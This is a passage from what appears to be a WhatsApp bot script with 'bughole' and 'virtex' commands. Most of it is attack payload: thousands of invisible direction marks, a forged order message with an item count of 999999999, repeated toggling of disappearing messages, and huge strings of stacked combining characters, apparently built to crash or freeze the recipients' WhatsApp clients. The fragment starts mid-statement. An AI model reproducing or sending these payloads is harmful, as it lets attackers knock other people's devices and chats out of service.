‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎Virgam!!★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏
`
kurzxd.sendMessage(from, wew, image, {thumbnail:fs.readFileSync(`hm/vvirgamv2.jpeg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`hm/vvirgamv2.jpeg`),"itemCount":999999999,"status":"INQUIRY","surface":"CATALOG","message":` BODY `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},caption: lzain,contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
break		
case 'superhole':
await kurzxd.toggleDisappearingMessages(from)
kurzxd.sendMessage(from, bughole(prefix), text)
break
case 'pythonhole':
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.sendMessage(from, bughole(prefix), text)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
        listMsg = {
 buttonText: 'PYTHON HOLE',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex2(prefix)}`,
 sections: [
                     {
                      "title": "Cie",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
kurzxd.sendMessage(from, listMsg, MessageType.listMessage, {quoted:kurz})
        kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 'wokwok')
kurzxd.sendMessage(from, `ஓঔ🛡⇝͜͡✪𝕷𝖔𝖗𝖉\x20𝕬𝖗𝖎𝖋𝖎🦅\x20͜͡✪*\x0a*~*.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.*999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭999999**ผิดุท้่เึางืผิดุท้่เึางื**9999999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭৭৭৭৭৭*MythicXbot*๒๒๒๒๒๒๒๒*MythicXbot*৭৭৭৭৭৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ